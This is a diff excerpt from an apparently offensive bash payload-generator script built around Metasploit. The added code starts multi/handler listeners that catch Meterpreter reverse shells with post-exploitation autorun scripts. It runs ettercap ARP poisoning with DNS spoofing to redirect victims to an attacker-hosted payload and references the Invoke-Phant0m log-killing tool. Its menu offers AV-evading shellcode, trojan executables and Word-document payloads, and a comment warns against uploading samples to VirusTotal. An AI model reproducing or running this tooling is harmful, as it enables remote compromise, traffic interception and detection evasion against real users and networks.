+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "- ATTACK VECTOR: http://$LhOst"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
+        fi
+    fi
+
+
+else
+
+
+  echo "[x] Abort execution .."
+  sleep 2
+fi
+
+
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files .."
+sleep 2
+rm $ApAcHe/$N4m > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+sleep 2
+cd output
+rm *.ini
+clear
+cd $IPATH/
+}
+
+
+
+
+
+
+
+
+sh_menu () {
+echo "main menu" > /dev/null 2>&1
+}
 
 
 # -----------------------------
@@ -6604,9 +9005,12 @@ cat << !
     | 20 - web_delivery  unix(s)      SH,PYTHON      DEB          |
     | 21 - shellcode     android      DALVIK         APK          |
     | 22 - shellcode     windows      EXE-SERVICE    EXE          |
-    | 23 - shellcode     multi OS     C,PYTHON       DOCM(word)   |
-    | 24 - shellcode     windows      PYTHON         PPSX(word)   |
+    | 23 - shellcode     windows      C,SSL-PYTHON   EXE          |
+    | 24 - shellcode     windows      C,AVET         EXE          |
+    | 25 - shellcode     windows      TROJAN         EXE          |
+    | 26 - shellcode     multi OS     PYTHON         PYTHON       |
     ╠─────────────────────────────────────────────────────────────╣
+    |  O - microsoft word payloads                                |
     |  S - system built-in shells                                 |
     |  E - exit Shellcode Generator                               |
     ╚─────────────────────────────────────────────────────────────╣
@@ -6642,6 +9046,10 @@ case $choice in
 22) sh_shellcode22 ;;
 23) sh_shellcode23 ;;
 24) sh_shellcode24 ;;
+25) sh_shellcode25 ;;
+26) sh_shellcode26 ;;
+O) sh_world ;;
+o) sh_world ;;
 S) sh_buildin ;;
 s) sh_buildin ;;
 e) sh_exit ;;
